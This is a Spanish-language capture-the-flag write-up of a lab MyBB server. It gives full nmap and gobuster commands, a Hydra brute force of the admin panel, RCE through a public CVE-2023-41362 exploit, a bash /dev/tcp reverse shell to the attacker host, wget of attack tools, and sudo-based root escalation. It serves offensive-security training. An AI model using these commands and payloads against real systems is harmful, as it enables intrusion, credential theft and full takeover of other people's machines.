@@ -1,0 +1,236 @@
+# Enumeracion de Puertos, Servicios y Versiones
+
+nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 -vvv -oN nmap 172.17.0.2
+
+Nmap scan report for 172.17.0.2
+Host is up, received arp-response (0.0000040s latency).
+Scanned at 2024-10-19 13:45:52 -03 for 7s
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-title: MyBB
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+al chequear el servicio web y al intentar ir a >> Forum me muestra el siguiente dominio: http://panel.mybb.dl/
+el cual agrego al archivo /etc/hosts para poder acceder a el...
+
+al ir detallando me encuentro con un user: admin
+
+==================================================================
+Our members have made a total of 0 posts in 0 threads.
+We currently have 1 members registered.
+Please welcome our newest member, admin
+The most users online at one time was 1 on 06-16-2024 at 02:51 PM 
+==================================================================
+
+ahora realizare fuzzing web
+
+# Fuzzing Web
+
+gobuster dir -u http://panel.mybb.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html,py,db,js,png,jpg -t 200 -b 404,403 --no-error
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://panel.mybb.dl/
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404,403
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,py,db,js,png,jpg,php,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 200) [Size: 13761]
+/rss.php              (Status: 302) [Size: 0] [--> syndication.php]
+/images               (Status: 301) [Size: 315] [--> http://panel.mybb.dl/images/]
+/archive              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/archive/]
+/contact.php          (Status: 200) [Size: 12695]
+/search.php           (Status: 200) [Size: 14972]
+/uploads              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/uploads/]
+/misc.php             (Status: 200) [Size: 0]
+/stats.php            (Status: 200) [Size: 10463]
+/admin                (Status: 301) [Size: 314] [--> http://panel.mybb.dl/admin/]
+/global.php           (Status: 200) [Size: 98]
+/member.php           (Status: 302) [Size: 0] [--> index.php]
+/online.php           (Status: 200) [Size: 11305]
+/showthread.php       (Status: 200) [Size: 10562]
+/portal.php           (Status: 200) [Size: 13640]
+/report.php           (Status: 200) [Size: 11097]
+/memberlist.php       (Status: 200) [Size: 18803]
+/css.php              (Status: 200) [Size: 0]
+/forumdisplay.php     (Status: 200) [Size: 10542]
+/install              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/install/]
+/announcements.php    (Status: 200) [Size: 10326]
+/polls.php            (Status: 200) [Size: 0]
+/javascript           (Status: 301) [Size: 319] [--> http://panel.mybb.dl/javascript/]
+/cache                (Status: 301) [Size: 314] [--> http://panel.mybb.dl/cache/]
+/private.php          (Status: 200) [Size: 11211]
+/syndication.php      (Status: 200) [Size: 429]
+/calendar.php         (Status: 200) [Size: 27317]
+/inc                  (Status: 301) [Size: 312] [--> http://panel.mybb.dl/inc/]
+/newreply.php         (Status: 200) [Size: 10324]
+/printthread.php      (Status: 200) [Size: 10324]
+/captcha.php          (Status: 200) [Size: 0]
+/usercp.php           (Status: 200) [Size: 11332]
+/attachment.php       (Status: 200) [Size: 10328]
+/newthread.php        (Status: 200) [Size: 10301]
+/task.php             (Status: 200) [Size: 43]
+/warnings.php         (Status: 200) [Size: 11097]
+/reputation.php       (Status: 200) [Size: 10343]
+/backups              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/backups/]
+/htaccess.txt         (Status: 200) [Size: 3088]
+/jscripts             (Status: 301) [Size: 317] [--> http://panel.mybb.dl/jscripts/]
+/moderation.php       (Status: 200) [Size: 11090]
+/editpost.php         (Status: 200) [Size: 11097]
+Progress: 1868787 / 1868796 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+a priori observo que existe el directorio: http://panel.mybb.dl/admin/
+al acceder a el me lleva a un panel de login y si recuerdo, habia un user nuevo: admin
+por lo que realizare un ataque de diccionario con el user admin al panel de login
+
+# ataque al panel de login
+
+1) capturar la peticion con burpsuite
+
+Peticion capturada:
+========================================================================================================================
+POST /admin/index.php HTTP/1.1
+Host: panel.mybb.dl
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+Origin: null
+Connection: keep-alive
+Cookie: mybb[lastvisit]=1729357893; mybb[lastactive]=1729360688; sid=d1884c757f8e814476ad2b3970c56b2f
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+username=admin&password=admin&do=login
+==========================================================================================================================
+
+2) pasar los parametros a hydra
+
+hydra -l admin -P wordlist "panel.mybb.dl" http-post-form "/admin/index.php:username=^USER^&password=^PASS^&do=login:H=Cookie: mybb[lastvisit]=1729356409; mybb[lastactive]=1729356980; sid=29463f2cb3fac4c2c0fd171ef8913333:F=The username and password combination you entered is invalid." -V -t 1 -T 1
+
+-l: pasamos el user
+-P pasamos el diccionario
+-"panel.mybb.dl" : corresponde al host (en la peticion)
+-http-post-form: corresponde al tipo de solicitud 
+
+luego le pasamos la direccion al login seguido de la transmision del login continuando con las cookies y finalizando con el mensaje de error cuando las
+credenciales son incorrectas
+
+-V : modo detallado para cada intento
+-t y -T : para asegurarme de que no ejecute intentos en paralelo
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-19 15:11:19
+[DATA] max 1 task per 1 server, overall 1 task, 14344400 login tries (l:1/p:14344400), ~14344400 tries per task
+[DATA] attacking http-post-form://panel.mybb.dl:80/admin/index.php:username=^USER^&password=^PASS^&do=login:H=Cookie: mybb[lastvisit]=1729356409; mybb[lastactive]=1729356980; sid=29463f2cb3fac4c2c0fd171ef8913333:F=The username and password combination you entered is invalid.
+[ATTEMPT] target panel.mybb.dl - login "admin" - pass "123456" - 1 of 14344400 [child 0] (0/0)
+[ATTEMPT] target panel.mybb.dl - login "admin" - pass "12345" - 2 of 14344400 [child 0] (0/0)
+[ATTEMPT] target panel.mybb.dl - login "admin" - pass "babygirl" - 3 of 14344400 [child 0] (0/0)
+[80][http-post-form] host: panel.mybb.dl   login: admin   password: babygirl
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-19 15:11:21
+
+obtenemos las credenciales validas:
+
+[80][http-post-form] host: panel.mybb.dl   login: admin   password: babygirl
+
+# Acceso al panel de admin
+
+despues de acceder observo la version: MyBB 1.8.35
+y buscando en internet me consigo que es vulnerable: CVE-2023-41362
+me consigo con el siguiente exploit: https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE/blob/main/exploit.py
+
+segun las instrucciones, requiere del target user password
+
+python3 exploit.py http://panel.mybb.dl/admin/index.php admin babygirl
+
+no funciona, asi que tras chequear el codigo fuente del exploit deduzco que debo pasarle la url desde la raiz
+
+python3 exploit.py http://panel.mybb.dl admin babygirl
+[*] Logging into http://panel.mybb.dl/admin/ as admin
+WARNING: Template already contains our payload code? Skipping to sending commands...
+[*] Testing code exec...
+[*] Shell is working
+[*] Special commands: exit (quit), remove (removes backdoor), config (prints mybb config), dump (dumps user table)
+Enter Command> whoami
+www-data
+
+ahora si funciono, por lo que me pondre en escucha por netcat 
+
+nc -lnvp 4444
+
+y enviare desde el exploit una revershell
+
+Enter Command> bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"
+
+# Escalada de Privilegios
+
+sudo -l						| me solicita password
+find / -perm -4000 2>/dev/null			| nada por aqui
+cat /etc/passwd |grep sh
+root:x:0:0:root:/root:/bin/bash
+alice:x:1001:1001:,,,:/home/alice:/bin/bash
+
+tenemos un user: alice
+
+find / -user alice 2>/dev/null			
+find / -name '*.txt'
+
+como no encuentro nada, intentare con un ataque de diccionario al user alice
+
+1) enviar script y diccionario
+
+desde mi maquina atacante levanto un server python 
+
+python3 -m http.server 80
+
+2) descarga de diccionario y script maquina objetivo
+
+como no esta instalado curl, hago uso de wget
+
+cd /tmp
+wget http://172.17.0.1/rockyou.txt 
+wget http://172.17.0.1/Linux-Su-Force.sh 
+chmod +x Linux-Su-Force.sh
+./Linux-Su-Force.sh alice rockyou.txt 
+Contraseña encontrada para el usuario alice: tinkerbell
+
+su alice
+pass: tinkerbell
+sudo -l
+
+User alice may run the following commands on 5ce75c1fe1d2:
+    (ALL : ALL) NOPASSWD: /home/alice/scripts/*.rb
+
+
+puedo ejecutar cualquier script en ruby como sudo, por lo que creare un script que ejecute comandos del sistema
+
+echo 'exec "whoami"' > /home/alice/scripts/darksblack.rb && chmod +x /home/alice/scripts/darksblack.rb
+
+sudo /home/alice/scripts/darksblack.rb
+root
+
+ahora lo que hare sera escalar a root
+
+echo 'exec "/bin/bash"' > /home/alice/scripts/darksblack.rb
+sudo /home/alice/scripts/darksblack.rb
+whoami
+#root
